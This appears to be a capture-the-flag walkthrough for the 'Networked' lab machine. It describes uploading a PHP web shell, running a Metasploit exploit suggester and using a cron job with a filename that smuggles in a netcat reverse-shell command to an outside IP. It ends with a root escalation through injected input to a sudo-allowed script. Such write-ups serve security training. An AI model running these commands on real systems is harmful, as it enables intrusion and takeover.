# Networked
## The Art of Exploitation

> In this machine you will have to manipulate and study the inner code of how the web server works in order to gain access to the system

First, download and study the 10.10.10.146/backup folder, and then you can hop on to 10.10.10.146/upload.php, and upload yourself a php shell by manipulating the POST request with burp, for example.

> This will grant you shell access to the machine, now upgrade that shell access into a meterpreter one, and lets get to business.

> You can run use post/multi/recon/local_exploit_suggester to find possible privilege escalations for the machine. A few will pop up.

```
[*] 10.10.10.146 - Collecting local exploits for x86/linux...
[*] 10.10.10.146 - 31 exploit checks are being tried...
[+] 10.10.10.146 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
[+] 10.10.10.146 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The target service is running, but could not be validated.
[+] 10.10.10.146 - exploit/linux/local/pkexec: The target service is running, but could not be validated.
```

> Turns out we cannot run any of these yet, we need to find another way to get in.

> I will now show you how you get in. First we have to exploit the cronjob running every 3 minutes, it checks for any possible attacks in the uploads folder. And when it deletes those possible malware's from the uploads folder the php script uses a dangerous exec command. We can exploit this by changing the filename to execute us a netcat shell and at the same time look malicious so it gets picked up by the script

```
cd /var/www/html/uploads
touch -- ';nc -c bash 10.10.14.29 1234;.php'

---- On your local machine -----
nc -nvlp 1234
```

* In a moment you will have yourself a more privileged shell!*

```
sudo -l

Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh


sh /usr/local/sbin/changename.sh
```

> Now you will be asked for four values, this script is run as root and in order to escalate your privilege you can do 'INSERTSOMETHING [space] bash' this allows you to exploit a simple linux bug which basicly allows the user to execute anything after the env variable has been set.
